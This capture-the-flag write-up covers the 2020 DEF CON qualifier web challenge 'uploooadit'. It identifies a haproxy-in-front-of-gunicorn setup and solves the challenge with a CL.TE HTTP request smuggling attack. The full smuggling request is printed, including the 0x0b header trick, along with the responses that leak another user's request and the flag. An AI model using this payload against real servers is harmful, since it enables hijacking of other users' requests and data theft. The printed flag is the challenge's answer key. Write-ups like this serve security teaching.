# DEF CON CTF Qualifier 2020 – uploooadit

* **Category:** web
* **Points:** 110

## Challenge

> https://uploooadit.oooverflow.io/
> 
> Files:
> 
> [app.py](app.py) 358c19d6478e1f66a25161933566d7111dd293f02d9916a89c56e09268c2b54c
>
> [store.py](store.py) dd5cee877ee73966c53f0577dc85be1705f2a13f12eb58a56a500f1da9dc49c0

[Official solution here.](https://github.com/o-o-overflow/dc2020q-uploooadit)

## Solution

With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.

The functionality endpoint is `/files/`. The GUID can be set with `X-guid` HTTP header.

Analyzing the two given files ([app.py](app.py) and [store.py](store.py)) you can discover that no intended vulnerabilities are present.

Analyzing responses, you can discover some interesting HTTP headers:
* `Server`;
* `Via`;
* `X-Served-By`.

```
GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
Host: uploooadit.oooverflow.io


HTTP/1.1 404 NOT FOUND
Server: gunicorn/20.0.0
Date: Sat, 16 May 2020 13:20:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 232
Via: haproxy
X-Served-By: ip-10-0-0-183.us-east-2.compute.internal

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

It seems that the architecture is composed by a proxy (`haproxy` 1.9.10) and different hosts behind it (`gunicorn` 20.0.0) which run the application.

Considering the infrastructure, this seems to be an *[HTTP Desync Attack](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) CL.TE* scenario.

Other information can be found [here](https://nathandavison.com/blog/haproxy-http-request-smuggling) and [here](https://blog.deteact.com/gunicorn-http-request-smuggling/).

The malicious HTTP request will be the following (the char between `Transfer-Encoding:` and `chunked` is `0x0b`).

```
POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Content-Length: 175
Content-type: text/plain
Connection: keep-alive
X-guid: 00000000-0000-0666-1234-0000ffa20000
Transfer-Encoding:chunked

0

POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Connection: close
x-guid: 00000000-0000-0666-1234-0000ffa20000
Content-Type: text/plain
Content-Length: 387

A

```

Which will give the following answer.

```
HTTP/1.1 201 CREATED
Server: gunicorn/20.0.0
Date: Mon, 18 May 2020 00:31:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Via: haproxy
X-Served-By: ip-10-0-1-95.us-east-2.compute.internal

```

At this point it is sufficient to read the defined object.

```
GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
Host: uploooadit.oooverflow.io


```

Which will return a POST request containing the flag.

```
HTTP/1.1 200 OK
Server: gunicorn/20.0.0
Date: Mon, 18 May 2020 00:31:09 GMT
Content-Type: text/plain
Content-Length: 387
Via: haproxy
X-Served-By: ip-10-0-1-95.us-east-2.compute.internal

APOST /files/ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: invoker
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: text/plain
X-guid: b6e184e0-593e-4c5a-98da-0df304752a0e
Content-Length: 152
X-Forwarded-For: 127.0.0.1

Congratulations!
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}

```

The flag is the following.

```
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
```